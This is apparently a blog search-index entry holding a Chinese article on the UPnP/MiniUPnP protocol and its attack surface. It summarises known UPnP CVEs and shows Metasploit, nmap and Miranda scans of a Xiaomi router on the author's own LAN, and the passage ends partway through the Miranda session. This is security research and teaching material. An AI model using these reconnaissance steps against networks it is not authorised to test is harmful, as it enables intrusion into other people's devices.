<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小米路由器_MiniUPnP协议</title>
      <link href="/2019/04/21/XIAOMI-UPnP/"/>
      <url>/2019/04/21/XIAOMI-UPnP/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a href="http://miniupnp.free.fr/" target="_blank" rel="noopener">HomePage</a><br><a href="https://openwrt.org/docs/guide-user/firewall/upnp/miniupnpd" target="_blank" rel="noopener">OpenWRT与miniUPnP</a></p><blockquote><p>MiniUPnP项目提供了支持UPnP IGD(互联网网关设备)规范的软件。<br>在MiniUPnPd中添加了NAT-PMP和PCP支持。 对于客户端（MiniUPnPc）使用libnatpmp来支持NAT-PMP。<br>MiniUPnP守护程序（MiniUPnPd）支持OpenBSD，FreeBSD，NetBSD，DragonFly BSD（Open）Solaris和Mac OS X以及pf或ipfw（ipfirewall）或ipf和Linux with netfilter。 MiniUPnP客户端（MiniUPnPc）和MiniSSDPd是便携式的，可以在任何POSIX系统上运行。 MiniUPnPc也适用于MS Windows和AmigaOS（版本3和4）。</p></blockquote><h2 id="UPnP-IGD客户端轻量级库和UPnP-IGD守护进程"><a href="#UPnP-IGD客户端轻量级库和UPnP-IGD守护进程" class="headerlink" title="UPnP IGD客户端轻量级库和UPnP IGD守护进程"></a>UPnP IGD客户端轻量级库和UPnP IGD守护进程</h2><p>大多数家庭adsl /有线路由器和Microsoft Windows 2K/XP都支持UPnP协议。 MiniUPnP项目的目标是提供一个免费的软件解决方案来支持协议的“Internet网关设备”部分。</p><blockquote><p>用于UPnP设备的Linux SDK（libupnp）对我来说似乎太沉重了。 我想要最简单的库，占用空间最小，并且不依赖于其他库，例如XML解析器或HTTP实现。 所有代码都是纯ANSI C.</p></blockquote><p>miniupnp客户端库在x86 PC上编译，代码大小不到50KB。<br>miniUPnP守护程序比任何其他IGD守护程序小得多，因此非常适合在低内存设备上使用。 它也只使用一个进程而没有其他线程，不使用任何system（）或exec（）调用，因此保持系统资源使用率非常低。<br>该项目分为两个主要部分：</p><ul><li>MiniUPnPc，客户端库，使应用程序能够访问网络上存在的UPnP“Internet网关设备”提供的服务。 在UPnP术语中，MiniUPnPc是UPnP控制点。</li><li>MiniUPnPd，一个守护进程，通过作为网关的linux或BSD（甚至Solaris）为您的网络提供这些服务。 遵循UPnP术语，MiniUPnPd是UPnP设备。<br>开发MiniSSDPd与MiniUPnPc，MiniUPnPd和其他协作软件一起工作：1. MiniSSDPd监听网络上的SSDP流量，因此MiniUPnPc或其他UPnP控制点不需要执行发现过程，并且可以更快地设置重定向；   2.  MiniSSDPd还能够代表MiniUPnPd或其他UPnP服务器软件回复M-SEARCH SSDP请求。 这对于在同一台机器上托管多个UPnP服务很有用。<br>守护进程现在也可以使用netfilter用于linux 2.4.x和2.6.x. 可以使它在运行OpenWRT的路由器设备上运行。<br>由于某些原因，直接使用MiniUPnP项目中的代码可能不是一个好的解决方案。<br>由于代码很小且易于理解，因此为您自己的UPnP实现提供灵感是一个很好的基础。 C ++中的<a href="http://ktorrent.org/" target="_blank" rel="noopener">KTorrent</a> UPnP插件就是一个很好的例子。</li></ul><h2 id="MiniUPnP客户端库的实用性"><a href="#MiniUPnP客户端库的实用性" class="headerlink" title="MiniUPnP客户端库的实用性"></a>MiniUPnP客户端库的实用性</h2><p>只要应用程序需要侦听传入的连接，MiniUPnP客户端库的使用就很有用。例如：P2P应用程序，活动模式的FTP客户端，IRC（用于DCC）或IM应用程序，网络游戏，任何服务器软件。</p><ul><li>路由器的UPnP IGD功能的典型用法是使用MSN Messenger的文件传输。 MSN Messenger软件使用Windows XP的UPnP API打开传入连接的端口。 为了模仿MS软件，最好也使用UPnP。</li><li>已经为XChat做了一个补丁，以展示应用程序如何使用miniupnp客户端库。</li><li>传输，一个免费的软件BitTorrent客户端正在使用miniupnpc和libnatpmp。</li></ul><h2 id="MiniUPnP守护进程的实用性"><a href="#MiniUPnP守护进程的实用性" class="headerlink" title="MiniUPnP守护进程的实用性"></a>MiniUPnP守护进程的实用性</h2><p>UPnP和NAT-PMP用于改善NAT路由器后面的设备的互联网连接。 诸如游戏，IM等的任何对等网络应用可受益于支持UPnP和/或NAT-PMP的NAT路由器。最新一代的Microsoft XBOX 360和Sony Playstation 3游戏机使用UPnP命令来启用XBOX Live服务和Playstation Network的在线游戏。 据报道，MiniUPnPd正在与两个控制台正常工作。 它可能需要一个精细的配置调整。</p><h2 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h2><p>UPnP实施可能会受到安全漏洞的影响。 错误执行或配置的UPnP IGD易受攻击。 安全研究员HD Moore做了很好的工作来揭示现有实施中的漏洞：<a href="http://hdm.io/writing/originals/SecurityFlawsUPnP.pdf" target="_blank" rel="noopener">通用即插即用（PDF）中的安全漏洞</a>。 一个常见的问题是让SSDP或HTTP/SOAP端口对互联网开放：它们应该只能从LAN访问。</p><h1 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h1><p>工作流程<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830377/paper/111.png" alt></p><p>Linux体系结构<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830425/paper/112.png" alt></p><h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830465/paper/113.png" alt><br>给定一个IP地址（通过DHCP获得），UPnP网络中的第一步是发现。<br>当一个设备被加入到网络中并想知道网络上可用的UPnP服务时，UPnP检测协议允许该设备向控制点广播自己的服务。通过UDP协议向端口1900上的多播地址239.255.255.250发送发现消息。此消息包含标头，类似于HTTP请求。此协议有时称为HTTPU（HTTP over UDP）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP / 1.1</span><br><span class="line">主机：239.255.255.250 ：1900</span><br><span class="line">MAN：ssdp：discover</span><br><span class="line">MX：10</span><br><span class="line">ST：ssdp：all</span><br></pre></td></tr></table></figure></p><p>所有其他UPnP设备或程序都需要通过使用UDP单播将类似的消息发送回设备来响应此消息，并宣布设备或程序实现哪些UPnP配置文件。对于每个配置文件，它实现一条消息发送：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP / 1.1 200 OK</span><br><span class="line">CACHE-CONTROL：max-age = 1800</span><br><span class="line">EXT：</span><br><span class="line">LOCATION：http：//10.0.0.138：80 / IGD.xml</span><br><span class="line">SERVER：SpeedTouch 510 4.0.0.9.0 UPnP / 1.0（DG233B00011961）</span><br><span class="line">ST：urn：schemas-upnp-org：service：WANPPPConnection：1</span><br><span class="line">USN：uuid：UPnP-SpeedTouch510 :: urn：schemas-upnp-org：service：WANPPPConnection：1</span><br></pre></td></tr></table></figure></p><p>类似地，当一个控制点加入到网络中的时候，它也能够搜索到网络中存在的、感兴趣的设备相关信息。这两种类型的基础交互是一种仅包含少量、重要相关设备信息或者它的某个服务。比如，类型、标识和指向更详细信息的链接。<br>UPnP检测协议是 <strong><em>基于简单服务发现协议（SSDP）</em></strong> 的。</p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>UPnP网络的下一步是描述。当一个控制点检测到一个设备时，它对该设备仍然知之甚少。为了使控制点了解更多关于该设备的信息或者和设备进行交互，控制点必须从设备发出的检测信息中包含的URL获取更多的信息。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830499/paper/114.png" alt><br>某个设备的UPnP描述是 <strong>XML</strong> 的方式,通过http协议，包括品牌、厂商相关信息，如型号名和编号、序列号、厂商名、品牌相关URL等。描述还包括一个嵌入式设备和服务列表，以及控制、事件传递和存在相关的URL。对于每种设备，描述还包括一个命令或动作列表，包括响应何种服务，针对各种动作的参数；这些变量描述出运行时设备的状态信息，并通过它们的数据类型、范围和事件来进行描述。</p><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830533/paper/1133.png" alt><br>UPnP网络的下一步是控制。当一个控制点获取到设备描述信息之后，它就可以向该设备发送指令了。为了实现此，控制点发送一个合适的控制消息至服务相关控制URL（包含在设备描述中）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line">  &lt;serviceType&gt; urn：schemas-upnp-org：service：WANPPPConnection：1 &lt;/ serviceType&gt;</span><br><span class="line">  &lt;serviceId&gt; urn：upnp-org： serviceId：wanpppc：pppoa &lt;/ serviceId&gt;</span><br><span class="line">  &lt;controlURL&gt; / upnp / control / wanpppcpppoa &lt;/ controlURL&gt;</span><br><span class="line">  &lt;eventSubURL&gt; / upnp / event / wanpppcpppoa &lt;/ eventSubURL&gt;</span><br><span class="line">  &lt;SCPDURL&gt; /WANPPPConnection.xml &lt;/ SCPDURL&gt;</span><br><span class="line">&lt;/ service&gt;</span><br></pre></td></tr></table></figure></p><p>要发送SOAP请求，只需要controlURL标记内的URL。控制消息也是通过 <strong><em>简单对象访问协议（SOAP）</em></strong> 用XML来描述的。类似函数调用，服务通过返回动作相关的值来回应控制消息。动作的效果，如果有的话，会反应在用于刻画运行中服务的相关变量。</p><h2 id="事件通知"><a href="#事件通知" class="headerlink" title="事件通知"></a>事件通知</h2><p>下一步是事件通知。UPnP中的事件 <strong><em>协议基于GENA</em></strong> 。一个UPnP描述包括一组命令列表和刻画运行时状态信息的变量。服务在这些变量改变的时候进行更新，控制点可以进行订阅以获取相关改变。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830573/paper/115.png" alt><br>服务通过发送事件消息来发布更新。事件消息包括一个或多个状态信息变量以及它们的当前数值。这些消息也是采用XML的格式，用通用事件通知体系进行格式化。一个特殊的初始化消息会在控制点第一次订阅的时候发送，它包括服务相关的变量名及值。为了支持多个控制点并存的情形，事件通知被设计成对于所有的控制点都平行通知。因此，所有的订阅者同等地收到所有事件通知。<br>当状态变量更改时，新状态将发送到已订阅该事件的所有程序/设备。程序/设备可以通过eventSubURL来订阅服务的状态变量，该URL可以在LOCATION指向的URL中找到。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line">  &lt;serviceType&gt; urn：schemas-upnp-org：service：WANPPPConnection：1 &lt;/ serviceType&gt;</span><br><span class="line">  &lt;serviceId&gt; urn：upnp-org：serviceId：wanpppc：pppoa &lt;/ serviceId&gt;</span><br><span class="line">  &lt;controlURL&gt; / upnp / control / wanpppcpppoa &lt;/ controlURL&gt;</span><br><span class="line">  &lt;eventSubURL&gt; / upnp / event / wanpppcpppoa &lt;</span><br><span class="line">  &lt;SCPDURL&gt; /WANPPPConnection.xml &lt;/ SCPDURL&gt;</span><br><span class="line">&lt;/ service&gt;</span><br></pre></td></tr></table></figure></p><h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p>最后一步是展示。如果设备带有存在URL，那么控制点可以通过它来获取设备存在信息，即在浏览器中加载URL，并允许用户来进行相关控制或查看操作。具体支持哪些操作则是由存在页面和设备完成的。<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555830618/paper/1111.png" alt></p><h2 id="NAT穿透"><a href="#NAT穿透" class="headerlink" title="NAT穿透"></a>NAT穿透</h2><p>UPnP为NAT（网络地址转换）穿透带来了一个解决方案：<strong>互联网网关设备协议（IGD）</strong>。NAT穿透允许UPnP数据包在没有用户交互的情况下，无障碍的通过路由器或者防火墙（假如那个路由器或者防火墙支持NAT）。</p><h1 id="SOAP和UPnP"><a href="#SOAP和UPnP" class="headerlink" title="SOAP和UPnP"></a>SOAP和UPnP</h1><table><thead><tr><th>协议</th><th>全称</th></tr></thead><tbody><tr><td>UPnP</td><td>Universal Plug and Play</td></tr><tr><td>SSDP</td><td>Simple Service Discovery Protocol</td></tr><tr><td>SCPD</td><td>Service Control Protocol Definition</td></tr><tr><td>SOAP</td><td>Simple Object Access Protocol</td></tr></tbody></table><h2 id="UPnP-Discovery"><a href="#UPnP-Discovery" class="headerlink" title="UPnP - Discovery"></a>UPnP - Discovery</h2><p><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555576753/paper/1.png" alt></p><h2 id="UPnP-–-Description"><a href="#UPnP-–-Description" class="headerlink" title="UPnP – Description"></a>UPnP – Description</h2><ul><li>XML文件通常托管在高位的TCP端口</li><li>版本信息<br>upnp.org spec<br>通常为1.0</li><li>设备定义<br>型号名和编号、序列号、厂商名、品牌相关URL<br>服务列表：服务类型；SCPD URL；Control URL；Event URL<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555576810/paper/2.png" alt><h2 id="UPnP-–-SCPD"><a href="#UPnP-–-SCPD" class="headerlink" title="UPnP – SCPD"></a>UPnP – SCPD</h2></li><li>定义服务动作和参数的XML文件</li><li>版本信息<br>和描述一致</li><li>动作列表<br>动作名<br>参数：参数名、方向（输入输出）、变量名</li><li>变量列表<br>变量名、数据类型<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555577220/paper/3.png" alt><h2 id="UPnP-–-Control"><a href="#UPnP-–-Control" class="headerlink" title="UPnP – Control"></a>UPnP – Control</h2></li><li>这里用到了SOAP</li><li>主要是RPC服务或CGI脚本的前端</li><li>SOAP封装<br>• XML格式的API调用<br>• 描述XML中的服务类型<br>• 来自SCPD XML的动作名称和参数</li><li>POST封装到control URL<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555577719/paper/4.png" alt><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555577820/paper/5.png" alt><h2 id="好的一面"><a href="#好的一面" class="headerlink" title="好的一面"></a>好的一面</h2></li><li>Control AV equipment</li><li>Home automation</li><li>Network administration</li><li>Physical security systems (ok, easy there buddy)</li><li>Industrial monitoring and control (uh…what?)</li><li>And this is just the official specs<br>All our devices can talk to each other! Brave new worlds of remote control and automation! Have your toaster turn on the lights, set the TV to the news channel, and send you a text message when breakfast is ready! The future is now! Nothing could possibly go wrong!<h2 id="关于安全"><a href="#关于安全" class="headerlink" title="关于安全"></a>关于安全</h2></li></ul><ol><li>嵌入式设备</li></ol><ul><li>有限的内存和处理能力</li><li>硬件和软件开发人员通常是完全不同的公司</li><li>复制和粘贴开发</li><li>保持低成本</li><li>不完全关心/懂行</li></ul><ol start="2"><li>部署</li></ol><ul><li>数以百万计的面向互联网的UPnP设备</li><li>要计算的供应商太多</li><li>前端是标准化的，后端甚至在同一供应商内也有所不同</li><li>难以修补/更新固件</li><li>仅仅因为你可以，并不意味着你应该</li></ul><ol start="3"><li>XML解析很难</li></ol><ul><li>需要大量系统资源</li><li>自由格式的用户提供的数据</li><li>2013年，2.5％的CVE与XML相关[2]，其中，近36％的患者CVSS严重程度为7或以上</li><li>随着XML的用例增长，版本也越来越多：递归错误，XXE，命令注入等……</li></ul><h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><ul><li>UPnP服务<br>• HTTP头解析<br>• SSDP解析<br>• OS命令注入<br>• 信息披露</li><li>SOAP服务<br>• HTTP头解析<br>• XML解析<br>• 注射用品<br>• OS命令<br>• SQL注入<br>• SOAP注入<br>• 信息披露<br>• 可疑级别的未经身份验证的设备控制<h2 id="Attack-surface-–-UPnP"><a href="#Attack-surface-–-UPnP" class="headerlink" title="Attack surface – UPnP"></a>Attack surface – UPnP</h2></li><li><p><a href="https://community.rapid7.com/docs/DOC-2150" target="_blank" rel="noopener">CVE-2012-5958</a><br>去年由HD Moore（众多之一）披露；调用strncpy将ST头中的字符串复制到TempBuf[COMMAND_LEN]；strncpy的长度参数基于冒号之间的字符数<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555580242/paper/6.png" alt></p></li><li><p>D-Link DIR-815 <a href="http://shadow-file.blogspot.com/2013/02/dlink-dir-815-upnp-command-injection.html" target="_blank" rel="noopener">UPnP命令注入</a><br>去年由Zach Cutlip披露;ST头的内容作为参数传递给M-SEARCH.sh;无需验证<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555580904/paper/7.png" alt></p></li></ul><h2 id="Attack-surface-–-SOAP"><a href="#Attack-surface-–-SOAP" class="headerlink" title="Attack surface – SOAP"></a>Attack surface – SOAP</h2><ul><li><p>XBMC soap_action_name<a href="http://www.exploit-db.com/exploits/15347/" target="_blank" rel="noopener">缓冲区溢出</a><br>由n00b于2010年10月公布;ProcessHttpPostRequest函数分配静态大小的缓冲区;调用sscanf将SOAPAction标头的值复制到其中，没有边界检查<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555581152/paper/8.png" alt></p></li><li><p>博通SetConnectionType<a href="http://sebug.net/paper/Exploits-Archives/2013-exploits/1301-exploits/DC-2013-01-003.txt" target="_blank" rel="noopener">格式字符串漏洞</a><br>去年Leon Juranic和Vedran Kajic透露；SetConnectionType操作将NewConnectionType参数的值提供给snprintf；不对用户控制的值进行检查<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555581385/paper/9.png" alt></p></li><li><p><a href="http://www.pnigos.com/?p=260" target="_blank" rel="noopener">CVE-2014-3242</a><br>今年早些时候由pnig0s披露;SOAPpy允许在SOAP请求中声明用户定义的XML外部实体;不对用户控制的值进行检查<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555581672/paper/10.png" alt></p></li><li><p><a href="http://seclists.org/fulldisclosure/2014/May/32" target="_blank" rel="noopener">CVE-2014-2928</a><br>Brandon Perry今年早些时候公布了（PBerry Crunch！）;F5 iControl API set_hostname操作将hostname参数的值传递给shell;再一次，不对用户控制的值进行消毒<br><img src="https://res.cloudinary.com/dozyfkbg3/image/upload/v1555581840/paper/11.png" alt></p></li><li><p><a href="http://toor.do/DEFCON-19-Garcia-UPnP-Mapping-WP.pdf" target="_blank" rel="noopener">CVE-2011-4499，CVE-2011-4500，CVE-2011-4501，CVE-2011-4503，CVE-2011-4504，CVE-2011-4505，CVE-2011-4506，更多？</a><br>Daniel Garcia在Defcon 19上披露; UPnP IGD 使用AddPortMapping和DeletePortMapping等操作来允许远程管理路由规则;缺乏身份验证，可在WAN接口上使用; 使攻击者能够执行：•NAT遍历 •外部/内部主机端口映射 •内部LAN的外部网络扫描</p></li></ul><h2 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h2><ul><li>了解您的网络<br>M-SEARCH你连接的每个网络以监听新的NOTIFY消息</li><li>如果您不需要UPnP，请将其禁用<br>如果不在设备上，则在路由器上</li><li>随时掌握固件更新<br>并非总是自动的</li><li>模糊测试<br>Burp – <a href="http://portswigger.net/burp/" target="_blank" rel="noopener">http://portswigger.net/burp/</a><br>WSFuzzer – <a href="https://www.owasp.org/index.php/Category:OWASP_WSFuzzer_Project" target="_blank" rel="noopener">https://www.owasp.org/index.php/Category:OWASP_WSFuzzer_Project</a><br>Miranda – <a href="http://code.google.com/p/miranda-upnp/" target="_blank" rel="noopener">http://code.google.com/p/miranda-upnp/</a></li></ul><h1 id="对小米WIFI路由器的UPnP分析"><a href="#对小米WIFI路由器的UPnP分析" class="headerlink" title="对小米WIFI路由器的UPnP分析"></a>对小米WIFI路由器的UPnP分析</h1><h2 id="使用工具扫描"><a href="#使用工具扫描" class="headerlink" title="使用工具扫描"></a>使用工具扫描</h2><h3 id="使用Metasploit检查"><a href="#使用Metasploit检查" class="headerlink" title="使用Metasploit检查"></a>使用Metasploit检查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf5 &gt; use auxiliary/scanner/upnp/ssdp_msearch</span><br><span class="line">msf5 auxiliary(scanner/upnp/ssdp_msearch) &gt; set RHOSTS 192.168.31.0/24</span><br><span class="line">RHOSTS =&gt; 192.168.31.0/24</span><br><span class="line">msf5 auxiliary(scanner/upnp/ssdp_msearch) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Sending UPnP SSDP probes to 192.168.31.0-&gt;192.168.31.255 (256 hosts)</span><br><span class="line">[*] 192.168.31.1:1900 SSDP MiWiFi/x UPnP/1.1 MiniUPnPd/2.0 | http://192.168.31.1:5351/rootDesc.xml | uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8c::upnp:rootdevice</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从中可以得到这些信息：</p><ul><li>UPnP/1.1</li><li>MiniUPnPd/2.0</li></ul><h3 id="使用nmap进行扫描"><a href="#使用nmap进行扫描" class="headerlink" title="使用nmap进行扫描"></a>使用nmap进行扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1900，5351 192.168.31.1</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1900/tcp filtered upnp</span><br><span class="line">5351/tcp open     nat-pmp</span><br></pre></td></tr></table></figure><p><strong><em>nat-pmp</em></strong><br>NAT端口映射协议（英语：NAT Port Mapping Protocol，缩写NAT-PMP）是一个能自动创建网络地址转换（NAT）设置和端口映射配置而无需用户介入的网络协议。该协议能自动测定NAT网关的外部IPv4地址，并为应用程序提供与对等端交流通信的方法。NAT-PMP于2005年由苹果公司推出，为更常见的ISO标准互联网网关设备协议（被许多NAT路由器实现）的一个替代品。该协议由互联网工程任务组（IETF）在RFC 6886中发布。<br>NAT-PMP使用用户数据报协议（UDP），在5351端口运行。该协议没有内置的身份验证机制，因为转发一个端口通常不允许任何活动，也不能用STUN方法实现。NAT-PMP相比STUN的好处是它不需要STUN服务器，并且NAT-PMP映射有一个已知的过期时间，应用可以避免低效地发送保活数据包。<br>NAT-PMP是端口控制协议（PCP）的前身。<br><a href="https://laucyun.com/25118b151a3386b7beff250835fe7e98.html" target="_blank" rel="noopener">https://laucyun.com/25118b151a3386b7beff250835fe7e98.html</a><br>2014年10月，Rapid7安全研究员Jon Hart公布，因厂商对NAT-PMP协议设计不当，估计公网上有1200万台网络设备受到NAT-PMP漏洞的影响。NAT-PMP协议的规范中特别指明，NAT网关不能接受来自外网的地址映射请求，但一些厂商的设计并未遵守此规定。黑客可能对这些设备进行恶意的端口映射，进行流量反弹、代理等攻击。</p><h3 id="netstat扫描"><a href="#netstat扫描" class="headerlink" title="netstat扫描"></a>netstat扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address         Foreign Address    State    in out PID/Program name</span><br><span class="line">tcp   0      0      :::5351               :::*               LISTEN   0 0 18068/miniupnpd</span><br><span class="line">udp   0      0      192.168.31.1:5351     0.0.0.0:*          0        0 18068/miniupnpd</span><br><span class="line">udp   0      0      0.0.0.0:1900          0.0.0.0:*          1414113  1827652 18068/miniupnpd</span><br></pre></td></tr></table></figure><p>端口1900在UPnP发现的过程中使用，5351通常为端口映射协议NAT-PMP运行的端口</p><h3 id="miranda"><a href="#miranda" class="headerlink" title="miranda"></a><a href="https://www.ethicalhacker.net/columns/heffner/plug-n-play-network-hacking/" target="_blank" rel="noopener">miranda</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">sudo python2 miranda.py -i wlx44334c388fbd -v</span><br><span class="line"></span><br><span class="line">Miranda v1.3</span><br><span class="line">The interactive UPnP client</span><br><span class="line">Craig Heffner, http://www.devttys0.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Binding to interface wlx44334c388fbd ...</span><br><span class="line"></span><br><span class="line">Verbose mode enabled!</span><br><span class="line">upnp&gt; msearch</span><br><span class="line"></span><br><span class="line">Entering discovery mode for &apos;upnp:rootdevice&apos;, Ctl+C to stop...</span><br><span class="line"></span><br><span class="line">****************************************************************</span><br><span class="line">SSDP reply message from 192.168.31.1:5351</span><br><span class="line">XML file is located at http://192.168.31.1:5351/rootDesc.xml</span><br><span class="line">Device is running MiWiFi/x UPnP/1.1 MiniUPnPd/2.0</span><br><span class="line">****************************************************************</span><br><span class="line"></span><br><span class="line">upnp&gt; host get 0</span><br><span class="line"></span><br><span class="line">Requesting device and service info for 192.168.31.1:5351 (this could take a few seconds)...</span><br><span class="line"></span><br><span class="line">Device urn:schemas-upnp-org:device:WANDevice:1 does not have a presentationURL</span><br><span class="line">Device urn:schemas-upnp-org:device:WANConnectionDevice:1 does not have a presentationURL</span><br><span class="line">Host data enumeration complete!</span><br><span class="line"></span><br><span class="line">upnp&gt; host list</span><br><span class="line"></span><br><span class="line">[0] 192.168.31.1:5351</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0</span><br><span class="line"></span><br><span class="line">xmlFile : http://192.168.31.1:5351/rootDesc.xml</span><br><span class="line">name : 192.168.31.1:5351</span><br><span class="line">proto : http://</span><br><span class="line">serverType : MiWiFi/x UPnP/1.1 MiniUPnPd/2.0</span><br><span class="line">upnpServer : MiWiFi/x UPnP/1.1 MiniUPnPd/2.0</span><br><span class="line">dataComplete : True</span><br><span class="line">deviceList : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0 deviceList</span><br><span class="line"></span><br><span class="line">InternetGatewayDevice : &#123;&#125;</span><br><span class="line">WANDevice : &#123;&#125;</span><br><span class="line">WANConnectionDevice : &#123;&#125;</span><br><span class="line"></span><br><span class="line">upnp&gt; host info 0 deviceList 